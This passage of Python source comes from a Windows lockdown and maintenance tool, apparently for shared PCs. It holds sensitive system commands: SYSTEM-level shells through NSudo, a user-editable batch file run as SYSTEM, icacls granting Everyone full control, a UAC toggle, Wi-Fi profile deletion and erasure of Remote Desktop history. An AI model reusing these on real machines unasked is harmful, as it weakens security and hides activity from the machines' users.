                        + "  <TopmostWhenRunning>false</TopmostWhenRunning>"
                        + chr(10)
                        + "  <HideFromTaskbar>true</HideFromTaskbar>"
                        + chr(10)
                        + "  <HideFromAltTab>true</HideFromAltTab>"
                        + chr(10)
                        + "  <HideMainWindow>true</HideMainWindow>"
                        + chr(10)
                        + "  <HideSystemTrayIcon>false</HideSystemTrayIcon>"
                        + chr(10)
                        + "  <LaunchAtLogon>false</LaunchAtLogon>"
                        + chr(10)
                        + "  <StartAtLaunch>false</StartAtLaunch>"
                        + chr(10)
                        + "  <MoveMouseHasBeenClicked>true</MoveMouseHasBeenClicked>"
                        + chr(10)
                        + "  <ActionsHaveBeenClicked>false</ActionsHaveBeenClicked>"
                        + chr(10)
                        + "  <OverrideWindowTitle>false</OverrideWindowTitle>"
                        + chr(10)
                        + "  <OverrideIcon>false</OverrideIcon>"
                        + chr(10)
                        + "  <RunningVolume>30</RunningVolume>"
                        + chr(10)
                        + "  <AdjustRunningVolume>false</AdjustRunningVolume>"
                        + chr(10)
                        + "  <MinimiseOnStop>false</MinimiseOnStop>"
                        + chr(10)
                        + "  <PreventScreenBurn>false</PreventScreenBurn>"
                        + chr(10)
                        + "  <ActiveWhenLocked>false</ActiveWhenLocked>"
                        + chr(10)
                        + "  <ShowMoveMouseStatus>false</ShowMoveMouseStatus>"
                        + chr(10)
                        + "  <DisableButtonAnimation>false</DisableButtonAnimation>"
                        + chr(10)
                        + "  <PauseOnBattery>false</PauseOnBattery>"
                        + chr(10)
                        + "  <LogLevel>Verbose</LogLevel>"
                        + chr(10)
                        + "  <ShowSystemTrayNotifications>false</ShowSystemTrayNotifications>"
                        + chr(10)
                        + "  <ShowTaskbarStatus>true</ShowTaskbarStatus>"
                        + chr(10)
                        + "  <Actions>"
                        + chr(10)
                        + "    <MoveMouseCursorAction>"
                        + chr(10)
                        + "      <Id>eb2243dd-94fa-45dd-bed7-3b9219b2359e</Id>"
                        + chr(10)
                        + "      <Name>挂机</Name>"
                        + chr(10)
                        + "      <IsEnabled>true</IsEnabled>"
                        + chr(10)
                        + "      <Repeat>true</Repeat>"
                        + chr(10)
                        + "      <Trigger>Interval</Trigger>"
                        + chr(10)
                        + "      <RepeatMode>Forever</RepeatMode>"
                        + chr(10)
                        + "      <IntervalThrottle>1</IntervalThrottle>"
                        + chr(10)
                        + "      <Distance>5</Distance>"
                        + chr(10)
                        + "      <UpperDistance>10</UpperDistance>"
                        + chr(10)
                        + "      <Random>true</Random>"
                        + chr(10)
                        + "      <Direction>Square</Direction>"
                        + chr(10)
                        + "      <Speed>Normal</Speed>"
                        + chr(10)
                        + "      <Delay>5</Delay>"
                        + chr(10)
                        + "    </MoveMouseCursorAction>"
                        + chr(10)
                        + "<CommandAction>"
                        + chr(10)
                        + "      <Id>4c8fd9de-fa77-4dcb-9ede-5c86c39add8e</Id>"
                        + chr(10)
                        + "      <Name>键盘工具</Name>"
                        + chr(10)
                        + "      <IsEnabled>true</IsEnabled>"
                        + chr(10)
                        + "      <Repeat>true</Repeat>"
                        + chr(10)
                        + "      <Trigger>Interval</Trigger>"
                        + chr(10)
                        + "      <RepeatMode>Forever</RepeatMode>"
                        + chr(10)
                        + "      <IntervalThrottle>1</IntervalThrottle>"
                        + chr(10)
                        + f"      <FilePath>{GameKeyBoardTool_exe}</FilePath>"
                        + chr(10)
                        + "      <Arguments>1</Arguments>"
                        + chr(10)
                        + "      <WaitForExit>true</WaitForExit>"
                        + chr(10)
                        + "      <Hidden>true</Hidden>"
                        + chr(10)
                        + "    </CommandAction>"
                        + chr(10)
                        + "  </Actions>"
                        + chr(10)
                        + "</Settings>"
                    )
                    if not os.path.isfile(MoveMouse_xml):
                        smart_open.KeepFolder(MoveMouse_data)
                        with smart_open.smart_opens(
                            MoveMouse_xml,
                            "w",
                        ) as f:
                            f.write(MoveMouse_xml_data)
                    # 将显示界面关闭
                    # 解析XML文件并返回ElementTree对象
                    MoveMouse_xml_tree = ET.parse(MoveMouse_xml)
                    # 获取XML文档的根元素
                    MoveMouse_xml_root = MoveMouse_xml_tree.getroot()
                    if not MoveMouse_xml_root == None:
                        # 查找具有指定标签的第一个子元素
                        MoveMouse_xml_element = MoveMouse_xml_root.find(
                            "HideMainWindow"
                        )
                        if not MoveMouse_xml_element == None:
                            if not MoveMouse_xml_element.text == "true":
                                MoveMouse_xml_element.text = "true"
                                MoveMouse_xml_tree.write(MoveMouse_xml)
                                RunWrapper(
                                    'taskkill /f /im MoveMouse.exe /t & powershell "Get-Process -Name MoveMouse | Stop-Process -Force"'
                                ).read()
                                TaskKeep("MoveMouse.exe", MoveMouse_exe, True)
            except:
                pass
            if os.path.exists(datadir + ":"):
                smart_open.KeepFolder(datadir + ":\\CrashDumps")
                smart_open.KeepFolder(datadir + ":\\Files")
                smart_open.KeepFolder(datadir + ":\\Zhang")
                smart_open.KeepFolder(datadir + ":\\Program")
                smart_open.KeepFolder(datadir + ":\\Users")
                smart_open.KeepFolder(datadir + ":\\Files\\Data")
                smart_open.KeepFolder(datadir + ":\\Files\\Develop")
                smart_open.KeepFolder(datadir + ":\\Important")
                smart_open.KeepFolder(datadir + ":\\Important\\Data")
                smart_open.KeepFolder(datadir + ":\\Important\\System_Backup")
                Driver_Backup_Path = (
                    datadir + ":\\Important\\System_Backup\\Drivers_Backup"
                )
                smart_open.KeepFolder(Driver_Backup_Path)
                smart_open.KeepFolder(datadir + ":\\StorageRedirect")
                smart_open.KeepFolder(datadir + ":\\StorageRedirect\\Program")
                smart_open.KeepFolder(datadir + ":\\StorageRedirect\\Wlansvc")
                smart_open.KeepFolder(datadir + ":\\StorageRedirect\\Registry")
                RunWrapper("attrib +h " + datadir + ":\\StorageRedirect\\Wlansvc")
                smart_open.KeepFolder(datadir + ":\\StorageRedirect\\Vault")
                RunWrapper("attrib +h " + datadir + ":\\StorageRedirect\\Vault")
                smart_open.KeepFolder(datadir + ":\\StorageRedirect\\HuoRongData")
                RunWrapper("attrib +h " + datadir + ":\\StorageRedirect\\HuoRongData")
                smart_open.KeepFolder(datadir + ":\\StorageRedirect\\Data")
                smart_open.KeepFolder(f"{datadir}:\\StorageRedirect\\Data\\BLESyncData")
                with smart_open.smart_opens(datadir + ":\\Users\\说明.txt", "w") as f:
                    f.write(RestoreAppdata_tips_text)
                with smart_open.smart_opens(
                    datadir + ":\\Users\\重置UWP.bat", "w"
                ) as f:
                    f.write(
                        "@echo off"
                        + chr(10)
                        + "echo 正在重置所有UWP应用，请稍候..."
                        + chr(10)
                        + "powershell -NoProfile -ExecutionPolicy Bypass -Command ^"
                        + chr(10)
                        + ""
                        + chr(34)
                        + "Get-AppxPackage -AllUsers ^| Foreach {Add-AppxPackage -DisableDevelopmentMode -Register \\"
                        + chr(34)
                        + "$($_.InstallLocation)\\AppxManifest.xml\\"
                        + chr(34)
                        + "}"
                        + chr(34)
                        + ""
                        + chr(10)
                        + "cls"
                        + chr(10)
                        + "echo 完成。"
                        + chr(10)
                        + "pause"
                        + chr(10)
                        + ""
                    )
                with smart_open.smart_opens(
                    datadir + ":\\Users\\设置权限.bat", "w"
                ) as f:
                    f.write(
                        "@echo off"
                        + chr(10)
                        + "cd /d "
                        + chr(34)
                        + "%~dp0"
                        + chr(34)
                        + ""
                        + chr(10)
                        + "set "
                        + chr(34)
                        + "FOLDER=%cd%"
                        + chr(34)
                        + ""
                        + chr(10)
                        + "title 设置权限"
                        + chr(10)
                        + "echo 正在设置权限:%cd%"
                        + chr(10)
                        + "icacls "
                        + chr(34)
                        + "%FOLDER%"
                        + chr(34)
                        + " /grant "
                        + chr(34)
                        + "SYSTEM"
                        + chr(34)
                        + ':(OI)(CI)(F) /grant "Users":(OI)(CI)(F) /grant '
                        + chr(34)
                        + "Administrators"
                        + chr(34)
                        + ":(OI)(CI)(F) /grant "
                        + chr(34)
                        + "ALL APPLICATION PACKAGES"
                        + chr(34)
                        + ":(OI)(CI)(RX) /grant "
                        + chr(34)
                        + "Everyone"
                        + chr(34)
                        + ":(OI)(CI)(F) /T /C /Q >nul 2>nul"
                        + chr(10)
                        + "icacls "
                        + chr(34)
                        + "%FOLDER%"
                        + chr(34)
                        + " /grant "
                        + chr(34)
                        + "ALL RESTRICTED APPLICATION PACKAGES"
                        + chr(34)
                        + ":(OI)(CI)(RX) /T /C >nul 2>nul"
                        + chr(10)
                        + "echo 权限设置完成"
                        + chr(10)
                        + "pause"
                        + chr(10)
                        + ""
                    )
                for i in get_all_user_profiles():
                    for j in i.items():
                        if (not j[0] in ("username", "sid", "key")) and ":\\" in j[0]:
                            try:
                                smart_open.KeepFolder(j[1])
                            except:
                                pass
                if hidesettingflag == "1":
                    smart_open.KeepFolder(datadir + ":\\学科文件夹")
                    try:
                        if os.path.isfile(XueKe_Folder_txt):
                            with smart_open.smart_opens(
                                XueKe_Folder_txt,
                                "r",
                            ) as f:
                                XueKe_Folders = f.read().splitlines()
                            for i in XueKe_Folders:
                                if not i[0] == "#":
                                    smart_open.KeepFolder(
                                        datadir + ":\\学科文件夹\\%s" % i
                                    )
                        else:
                            with smart_open.smart_opens(
                                XueKe_Folder_txt,
                                "w",
                            ) as f:
                                f.write(
                                    "#本文件用于定义学科文件夹内保护的文件夹,一行一个,井号开头注释,例如:\n语文\n数学\n外语\n物理\n化学\n生物\n历史\n政治\n地理"
                                )
                    except:
                        try:
                            if os.path.isfile(XueKe_Folder_txt):
                                os.remove(XueKe_Folder_txt)
                        except:
                            pass
                    hidexk = datadir + ":\\学科文件夹\\隐藏此文件夹.bat"
                    showxk = datadir + ":\\学科文件夹\\显示此文件夹.bat"
                    with smart_open.smart_opens(
                        hidexk,
                        "w",
                    ) as f:
                        f.write(
                            "cd /d %~dp0 & echo 1 > hide & cls & echo 完成,下一次启动时或手动设置一次隐藏生效 & timeout /NOBREAK /t 3"
                        )
                    with smart_open.smart_opens(
                        showxk,
                        "w",
                    ) as f:
                        f.write(
                            "cd /d %~dp0 & del /f /q /a hide & cls & echo 完成,下一次启动时或手动取消一次隐藏生效 & timeout /NOBREAK /t 3"
                        )
                else:
                    try:
                        size = 0
                        Folderpath = datadir + ":\\学科文件夹"
                        for path, dirs, files in os.walk(Folderpath):
                            for f in files:
                                fp = os.path.join(path, f)
                                size += os.path.getsize(fp)
                        if size <= 100:
                            shutil.rmtree(Folderpath)
                    except Exception as e:
                        pass
            maintain_mode_flag_change = (
                datadir + ":\\Files\\AutoCommand\\维护模式切换.bat"
            )
            if not os.path.isfile(maintain_mode_flag_change):
                smart_open.KeepFolder(datadir + ":\\Files\\AutoCommand")
                with smart_open.smart_opens(
                    maintain_mode_flag_change,
                    "w",
                ) as f:
                    f.write(
                        "@echo off & if exist MainTain (echo 不再自启维护模式 & del /f /q /a MainTain & pause) else (echo 将会自启维护模式 & echo 1 > MainTain & pause) "
                    )
            Disable_System_Backup_Bat = (
                datadir + ":\\Important\\System_Backup\\禁用自动备份.bat"
            )
            Enable_System_Backup_Bat = (
                datadir + ":\\Important\\System_Backup\\启用自动备份.bat"
            )
            Restore_System_Backup_Bat = (
                datadir + ":\\Important\\System_Backup\\还原驱动备份.bat"
            )
            Create_Append_System_Backup_Bat = (
                datadir + ":\\Important\\System_Backup\\创建差异备份.bat"
            )
            if not os.path.isfile(Disable_System_Backup_Bat):
                with smart_open.smart_opens(
                    Disable_System_Backup_Bat,
                    "w",
                ) as f:
                    f.write(
                        "cd /d %~dp0 & echo 1 > nobackup & cls & echo 完成,下一次启动时生效 & timeout /NOBREAK /t 3"
                    )
            if not os.path.isfile(Enable_System_Backup_Bat):
                with smart_open.smart_opens(
                    Enable_System_Backup_Bat,
                    "w",
                ) as f:
                    f.write(
                        "cd /d %~dp0 & del /f /q /a nobackup & cls & echo 完成,下一次启动时生效 & timeout /NOBREAK /t 3"
                    )
            if not os.path.isfile(Create_Append_System_Backup_Bat):
                with smart_open.smart_opens(
                    Create_Append_System_Backup_Bat,
                    "w",
                ) as f:
                    f.write(
                        "cd /d %~dp0 & echo 1 > newbackup & cls & echo 完成,下一次启动时生效 & timeout /NOBREAK /t 3"
                    )
            Restore_Driver_Bat = (
                'echo 防止误触,按任意键继续 & pause & Dism /online /Add-Driver /Driver:"'
                + datadir
                + ":\\Important\\System_Backup\\Drivers_Backup"
                + '" /Recurse  & timeout /NOBREAK /t 3'
            )
            if not os.path.isfile(Restore_System_Backup_Bat):
                with smart_open.smart_opens(
                    Restore_System_Backup_Bat,
                    "w",
                ) as f:
                    f.write(Restore_Driver_Bat)
            if hidesettingflag == "1":
                if not os.path.exists(Onedriveupdatedir):  # OneDrive的同步目录是否存在
                    OneDriveFlag = False
                else:
                    OneDriveFlag = True
                if (ztimeoutA in range(0, 30)) and OneDriveFlag:
                    if os.path.isfile(Onedriveupdate):
                        os.remove(Onedriveupdate)
                        logger.log("移除同步诱导文件")
                else:
                    if OneDriveFlag:
                        if not os.path.isfile(Onedriveupdate):
                            with smart_open.smart_opens(
                                Onedriveupdate,
                                "w",
                            ) as f:
                                f.write(
                                    str(datetime.datetime.now())
                                    + "此文件为OneDrive同步文件"
                                )
                            logger.log("创建同步诱导文件")
                        if ztimeoutA >= 60:
                            ztimeoutA = 0
            smart_open.KeepFolder(AutoRunCommand)
            if not os.path.isfile(AutoRunCommandBat):
                with smart_open.smart_opens(
                    AutoRunCommandBat,
                    "w+",
                ) as f:
                    f.write(
                        "@echo off\ncd /d %~dp0\nrem 在此批处理文件中输入自定义命令,ZhangProtect将自动运行此批处理(管理员),将以Y回答所有问题"
                    )
            if ztimeoutB >= (400 if hidesettingflag == "1" else 120):
                ztimeoutB = 0
                RunWrapper("cmd /c " + AppRunC)
                RunWrapper(
                    'Taskkill /f /im NSudo.exe /t & powershell "Get-Process -Name NSudo | Stop-Process -Force"'
                )
                runas("users", CCleanerExe + " /AUTO")
                runas(
                    "SYSTEM",
                    "cmd /c " + AutoRunCommandBat + "<" + AutoAnswer + ">nul 2>nul",
                )
                RunWrapper(
                    "cmd /c " + AutoRunCommandBat + "<" + AutoAnswer + ">nul 2>nul"
                )
                if os.path.isfile(autorestart_desktopok):
                    RunWrapper(
                        'taskkill /f /im desktopok.exe /t & powershell "Get-Process -Name desktopok | Stop-Process -Force"'
                    )
                logger.log("用户延迟循环任务运行成功")
            if ztimeoutC >= 60:
                ztimeoutC = 0
                no_network_run_flag = False
                RunWrapper("cmd /c " + ProtectBAT + "<" + AutoAnswer + ">nul 2>nul")
                if os.path.isfile(auto_Timesync):
                    RunWrapper("%s /auto" % Timesync_exe)
                if not os.path.isfile(do_no_change_icon):
                    if os.path.isfile(ikun_icon_flag):
                        date_now = str(int(datetime.datetime.now().weekday()) + 1)
                        fullpath = os.path.abspath(
                            ikun_icon_dir + "\\%s.ico" % date_now
                        )
                        RunWrapper(
                            'for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\DriveIcons\\%i\\DefaultIcon /d "'
                            + fullpath
                            + '" /f)'
                        ).read()
            if os.path.isfile(user_show_clock_info):
                if os.path.isfile(clock_info_txt):
                    with smart_open.smart_opens(
                        clock_info_txt,
                        "r",
                    ) as f:
                        clock_info_x = f.read().splitlines()
                    if len(clock_info_x) >= 2:
                        clock_show_info(clock_info_x[0], clock_info_x[1])
                else:
                    with smart_open.smart_opens(
                        clock_info_txt,
                        "w",
                    ) as f:
                        f.write("自定义时钟信息\n自定义日期信息")
            else:
                if (
                    (os.path.isfile(openwifi) or hidesettingflag == "1")
                    and os.path.isfile(do_no_show_clock_info)
                ) and not os.path.isfile(closewifi):
                    clock_show_info("热点:" + wifiid, "密码:" + wifipw)
                else:
                    clock_show_info()
            RunWrapper("schtasks /run /tn zhangprotect\\KeepWifi")
            try:
                if os.path.isfile(clock_show_wifiinfo):
                    clock_show_mobilehospd_info(
                        wifiid, wifipw, Digital_Clock_4_dir + "\\settings.ini"
                    )
            except:
                pass
            if not os.path.isfile(ikun_wav_file):
                b64_to_file(ikun_wav_file, ikun_wav)
            set_background_shell("重定向火绒数据", HuoRongDataRedirect_bat)
            set_background_shell("重定向卡巴斯基数据", KasperskyDataRedirect_bat)
            set_background_shell(
                "提升的检查清理维护",
                "%s -U:S -P:E -M:S -Priority:RealTime %s" % (NSudo, MainTainClean),
            )
            set_background_shell("命令行", "cmd")
            set_background_shell(
                "提升的命令行", "%s -U:S -P:E -M:S -Priority:RealTime cmd" % (NSudo)
            )
            set_background_shell(
                "重启ZhangProtect",
                'cmd /c schtasks /End /tn ZhangProtect\\Protect & taskkill /f /im Protect.exe /t & powershell "Get-Process -Name Protect ^| Stop-Process -Force" & schtasks /Run /tn ZhangProtect\\Protect /I & start mshta vbscript:Msgbox("重启ZhangProtect操作成功完成")(window.close)',
            )
            set_background_shell("维护模式", Maintain_mode)
            set_background_shell("设置自动登录", Autologon_exe)
            set_background_shell("自动移动鼠标", MoveMouse_exe)
            set_background_shell("外置红点准星", ZhangGameRedDot_exe)
            set_background_shell("游戏挂机移动工具", GameKeyBoardTool_exe)
            set_background_shell("系统优化工具", Optimizer_exe)
            set_background_shell("启动项管理器", Autoruns64_exe)
            set_background_shell("默认应用管理器", DefaultAppLocker_exe)
            set_background_shell("时间校准工具", Timesync_exe)
            set_background_shell("进程管理器", procexp64_exe)
            set_background_shell("右键菜单管理器", ContextMenuManager_exe)
            set_background_shell("启动DiskGenius", diskgenius_exe)
            set_background_shell("保持唤醒", keep_awake_exe)
            set_background_shell("FastCopy", fastcopy_exe)
            set_background_shell("进程监控器", ProcessMonitor_exe)
            set_background_shell("文件分析工具", WizTree_exe)
            set_background_shell("提权工具", NSudo)
            set_background_shell("清理工具", CCleanerExe)
            set_background_shell("MAC修改工具", MacManager_exe)
            set_background_shell("配置管理器", ProtectControl)
            set_background_shell(
                "提升的维护模式",
                "%s -U:S -P:E -M:S -Priority:RealTime %s" % (NSudo, Maintain_mode),
            )
            set_background_shell("打开公用桌面目录", "explorer %public%\\desktop")
            set_background_shell("打开ZhangProtect目录", "explorer %s" % ProtectDir)
            set_background_shell("文件解锁工具", LockHunter_exe)
            set_background_shell(
                "更多选项",
                'mshta vbscript:Msgbox("您可进入ZhangProtect目录设置更多自定义参数,自定义参数均保存于txt,conf文件并带有说明")(window.close)',
            )
            create_zhang_shell_new()
            try:
                if os.path.isfile(more_background_target):
                    with smart_open.smart_opens(
                        more_background_target,
                        "r",
                    ) as f:
                        more_background_target_list = f.read().splitlines()
                    for i in more_background_target_list:
                        if (not i[0] == "#") and "*" in i:
                            i = i.split("*")
                            set_background_shell(i[0], i[1])
                else:
                    with smart_open.smart_opens(
                        more_background_target,
                        "w",
                    ) as f:
                        f.write(
                            "#在本文件内添加自定义右键菜单,一行一个,格式:[标签名*命令],井号开头作为注释,禁止包含无法识别的特殊字符.新项目将显示在右键菜单ZhangProtect选项内\n任务管理器*taskmgr"
                        )
            except:
                pass
            set_environment_path()
            Desktop_Defaut_ini = (
                "[DesktopOK]"
                + chr(10)
                + "m_lang_id=6"
                + chr(10)
                + "m_usertext=桌面布局"
                + chr(10)
                + "use_new_strategy=0"
                + chr(10)
                + "metrice_mode_icon=0"
                + chr(10)
                + "at_program_exit_save=0"
                + chr(10)
                + "at_program_start_restore=1"
                + chr(10)
                + "auto_at_program_exit_save=0"
                + chr(10)
                + "use_explorer_feature=1"
                + chr(10)
                + "m_explorer_enable_lines=1"
                + chr(10)
                + "m_explorer_disable_expando=0"
                + chr(10)
                + "m_explorer_indent=0"
                + chr(10)
                + "m_explorer_disable_fadeout=0"
                + chr(10)
                + "desktop_to_foreground_r=0"
                + chr(10)
                + "desktop_to_foreground_l=0"
                + chr(10)
                + "desktop_to_foreground_w=0"
                + chr(10)
                + "screen_shot_in_tray=0"
                + chr(10)
                + "the_drag_key=0"
                + chr(10)
                + "m_confim_del=1"
                + chr(10)
                + "use_alt_rmouse=0"
                + chr(10)
                + "use_auto_window_minimize=0"
                + chr(10)
                + "use_auto_window_minimize_sec=1200"
                + chr(10)
                + "auto_update_time=0"
                + chr(10)
                + "m_copy_move_jobs=1"
                + chr(10)
                + "desktop_to_foreground_no_wheel=0"
                + chr(10)
                + "kalendar_in_tray=0"
                + chr(10)
                + "m_save_win_rc=0"
                + chr(10)
                + "disable_at_ctrl_alt_strg=1"
                + chr(10)
                + "auto_disable_autoarange=1"
                + chr(10)
                + "soft_paint=1"
                + chr(10)
                + "disable_dark_theme=1"
                + chr(10)
                + "savemode=3"
                + chr(10)
                + "save_icon_spacing=1"
                + chr(10)
                + "save_icon_size=1"
                + chr(10)
                + "ignoring_min=1"
                + chr(10)
                + "only_changes=1"
                + chr(10)
                + "autosave=0"
                + chr(10)
                + "autosave_mode=1"
                + chr(10)
                + "last_t=0"
                + chr(10)
                + "autosave_keep=0"
                + chr(10)
                + "by_startup=0"
                + chr(10)
                + "start_totray=1"
                + chr(10)
                + "by_shutdown=0"
                + chr(10)
                + "keep_sort=0"
                + chr(10)
                + "sort_col=-1"
                + chr(10)
                + "sort_des=0"
                + chr(10)
                + "to_tray_if_close=1"
                + chr(10)
                + "autosave_start=0"
                + chr(10)
                + "autosave_shutdown=0"
                + chr(10)
                + "dok_use_resolution=1"
                + chr(10)
                + "dok_use_date=1"
                + chr(10)
                + "dok_use_time=1"
                + chr(10)
                + "dok_use_reverse_date=1"
                + chr(10)
                + "OVERWRITE_PROMPT=0"
                + chr(10)
                + "auto_hide_icons_sec=15"
                + chr(10)
                + "auto_hide_cursor_sec=5"
                + chr(10)
                + "use_auto_hide_cursor=0"
                + chr(10)
                + "show_icons_by_l_mouse=1"
                + chr(10)
                + "show_icons_by_r_mouse=1"
                + chr(10)
                + "show_icons_by_m_mouse=1"
                + chr(10)
                + "show_icons_mouse_move=1"
                + chr(10)
                + "use_auto_hide_icons=0"
                + chr(10)
                + "use_to_tray_by_close=1"
                + chr(10)
                + "use_screenschottor=1"
                + chr(10)
                + "use_url_cnt=0"
                + chr(10)
                + "hide_taskbar=0"
                + chr(10)
                + "for_startup=桌面布局"
                + chr(10)
                + "last_dok_folder="
                + chr(10)
                + "use_user_name=0"
                + chr(10)
                + "use_host_name=0"
                + chr(10)
                + "use_os_version=0"
                + chr(10)
                + "use_always_mouse_wheel=1"
                + chr(10)
                + "use_always_mouse_wheel_focus=0"
                + chr(10)
                + "use_task_volmouse=0"
                + chr(10)
                + "show_soundvol=0"
                + chr(10)
                + "use_lmouse_drag=0"
                + chr(10)
                + "use_alt_f4=0"
                + chr(10)
                + "use_rmouse_resize=1"
                + chr(10)
                + "poweroptions_in_tray=0"
                + chr(10)
                + "use_screen_shot_feature=0"
                + chr(10)
                + "screenshot_create_base64=0"
                + chr(10)
                + "screenshot_sound=0"
                + chr(10)
                + "cpu_usage_in_tray=0"
                + chr(10)
                + "mem_usage_in_tray=0"
                + chr(10)
                + "getpixel_in_tray=0"
                + chr(10)
                + "disable_in_metro_mode=1"
                + chr(10)
                + "disable_at_right=1"
                + chr(10)
                + "disable_at_left=1"
                + chr(10)
                + "use_left_right_scrool_at_SHIFT=0"
                + chr(10)
                + "hidden_when_you_press_an_key_on_the_keyboard=0"
                + chr(10)
                + "save_desktop_switch_user=1"
                + chr(10)
                + "save_windows_switch_user=1"
                + chr(10)
                + "auto_update_domain=0"
            ).replace(" ", "")
            try:
                for i in get_all_user_profiles():
                    DesktopOK_data = i["appdata"] + "\\DesktopOK"
                    Desktopok_ini_base = DesktopOK_data + "\\DesktopOK.ini"
                    Desktopok_ini_prot = ProtectDir + "DesktopOK-Backup.ini"
                    if os.path.isfile(Auto_Copy_DesktopOKConf):
                        if not os.path.isfile(Desktopok_ini_prot):
                            if os.path.isfile(Desktopok_ini_base):
                                try:
                                    with smart_open.smart_opens(
                                        Desktopok_ini_base,
                                        "r",
                                    ) as f:
                                        if (
                                            "[桌面布局]" in f.read()
                                        ):  # 有保存桌面布局才复制
                                            copy_files(
                                                Desktopok_ini_base, Desktopok_ini_prot
                                            )
                                except:
                                    pass
                        else:
                            copy_files(Desktopok_ini_prot, Desktopok_ini_base)
                    smart_open.KeepFolder(DesktopOK_data)
                    try:
                        for Desktop_ini in [Desktopok_ini_base, Desktopok_ini_prot]:
                            if os.path.isfile(Desktop_ini):
                                with smart_open.smart_opens(
                                    Desktop_ini,
                                    "r",
                                ) as f:
                                    DesktopOK_ini_r = f.read()
                                fuckstrs = [
                                    "Zeit=",
                                    "IconSize=",
                                    "VertSpacing=",
                                    "HorzSpacing=",
                                ]
                                if (any(x in DesktopOK_ini_r for x in fuckstrs)) or (
                                    not Desktop_Defaut_ini in DesktopOK_ini_r
                                ):
                                    DesktopOK_ini_r = DesktopOK_ini_r.splitlines()
                                    DesktopOK_ini_w = ""
                                    for i in DesktopOK_ini_r:
                                        if not i == "[DesktopOK]":
                                            if any(x in i for x in fuckstrs):
                                                DesktopOK_ini_w += chr(10) + ""
                                            else:
                                                DesktopOK_ini_w += chr(10) + str(i)
                                        else:
                                            DesktopOK_ini_w += (
                                                chr(10) + Desktop_Defaut_ini
                                            )
                                            break
                                    with smart_open.smart_opens(
                                        Desktop_ini,
                                        "wb",
                                    ) as f:
                                        f.write(b"\xff\xfe")
                                        f.write(DesktopOK_ini_w.encode("utf-16-le"))
                            else:
                                if not Desktop_ini == Desktopok_ini_prot:
                                    with smart_open.smart_opens(
                                        Desktop_ini,
                                        "wb",
                                    ) as f:
                                        f.write(b"\xff\xfe")
                                        f.write(Desktop_Defaut_ini.encode("utf-16-le"))
                    except Exception as e:
                        logger.log(
                            "抛出错误在DesktopOK配置"
                            + str(sys.exc_info())
                            + "行:"
                            + str(e.__traceback__.tb_lineno),
                        )
            except:
                pass
            if os.path.isfile(remove_all_wifi):
                RunWrapper("netsh wlan delete profile *")
                RunWrapper(
                    "del /f /q /a %s:\\StorageRedirect\\Wlansvc\\*.xml" % datadir
                )
            if os.path.isfile(hide_restart):
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start",
                    "HideRestart",
                    "reg_dword",
                    1,
                )
            else:
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start",
                    "HideRestart",
                    "reg_dword",
                    0,
                )
            if os.path.isfile(hide_sleep):
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start",
                    "HideSleep",
                    "reg_dword",
                    1,
                )
            else:
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start",
                    "HideSleep",
                    "reg_dword",
                    0,
                )
            if os.path.isfile(hide_hibernate):
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start",
                    "HideHibernate",
                    "reg_dword",
                    1,
                )
            else:
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start",
                    "HideHibernate",
                    "reg_dword",
                    0,
                )
            if os.path.isfile(hide_shutdown):
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start",
                    "HideShutDown",
                    "reg_dword",
                    1,
                )
            else:
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start",
                    "HideShutDown",
                    "reg_dword",
                    0,
                )
            if os.path.isfile(lock_volume):
                runas("users", volume_set_vbs)
            if os.path.isfile(break_key_pgup_pgdn):
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout",
                    "Scancode Map",
                    "REG_BINARY",
                    "000000000000000003000000000051e0000049e000000000",
                )
            reg_reader.reg_write(
                "HKEY_USERS\\.DEFAULT\\Control Panel\\Keyboard",
                "InitialKeyboardIndicators",
                "reg_sz",
                2,
            )
            hosts = WindowsDir + "\\System32\\drivers\\etc\\hosts"
            if not os.path.isfile(hosts):
                with smart_open.smart_opens(
                    hosts,
                    "w",
                ) as f:
                    f.write("localhost 127.0.0.1")
            try:
                program_files = os.getenv("programfiles")
                program_files_x86 = os.getenv("programfiles(x86)")
                del_bits(program_files)
                del_bits(program_files_x86)
            except:
                pass
            try:
                if os.path.isfile(del_mstsc_log):
                    for i in get_all_user_profiles():
                        docu = i["personal"]
                        dkey = i["key"]
                        RunWrapper('del /f /q /a "%s\\Default.rdp"' % docu)
                        reg_reader.reg_delete_key(
                            f"{dkey}\\Software\\Microsoft\\Terminal Server Client\\Default"
                        )
                        reg_reader.reg_delete_key(
                            f"{dkey}\\Software\\Microsoft\\Terminal Server Client\\Servers"
                        )
            except:
                pass
            if os.path.isfile(hide_mobilehospset):
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
                    "SettingsPageVisibility",
                    "REG_SZ",
                    "hide:network-mobilehotspot",
                )
            else:
                reg_reader.reg_delete_key(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
                    "SettingsPageVisibility",
                )
            if not os.path.isfile(use_USB_protect):
                RunWrapper("net share USBDiskShare /delete")
            reg_reader.reg_write(
                "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "EnableLUA",
                "REG_DWORD",
                ("0" if os.path.isfile(DisableLUA) else "1"),
            )
            try:
                if not os.path.isfile(use_networkguard):
